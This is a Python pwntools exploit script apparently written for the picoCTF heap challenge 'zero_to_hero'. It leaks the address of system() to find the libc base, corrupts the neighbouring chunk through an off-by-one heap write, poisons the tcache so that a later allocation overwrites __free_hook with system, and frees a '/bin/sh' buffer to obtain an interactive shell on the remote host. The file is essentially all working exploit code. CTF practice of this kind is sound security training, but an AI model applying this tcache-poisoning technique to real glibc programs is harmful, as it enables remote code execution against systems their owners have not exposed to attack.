#!/usr/bin/env python3
from pwn import *

PORT = 49260
HOST = "fickle-tempest.picoctf.net"
e = context.binary = ELF('./zero_to_hero_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b*0x400d8e
            b*0x0000000000400B03
            b*0x0000000000400C2E
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return e.process()

p = conn()

# Heap Pointer Array = 0x602060

p.sendline(b"y")
p.recvuntil(b"It's dangerous to go alone. Take this: ")
system = int(p.recvline()[:-1], 16)
log.info("system_leak: " + hex(system))
libc.address = system - 0x52fd0
log.info("libc_base: " + hex(libc.address))

def add(size, data):
    p.sendlineafter(b'> ', "1")
    p.sendlineafter(b"your description?\n", str(size).encode())
    p.sendlineafter(b"description: \n", data)

def remove(idx):
    p.sendlineafter(b'> ', "2")
    p.sendlineafter(b"to remove?\n", str(idx).encode())

add(0x18, b'1'*8)
add(0x108, b'2'*8)

remove(1)
remove(0)

add(0x18, b'A'*0x18)
remove(1)
add(0xf8, p64(libc.sym.__free_hook))
add(0x108, b'/bin/sh\0')
# GDB()
add(0x108, p64(system))

remove(4)

p.interactive()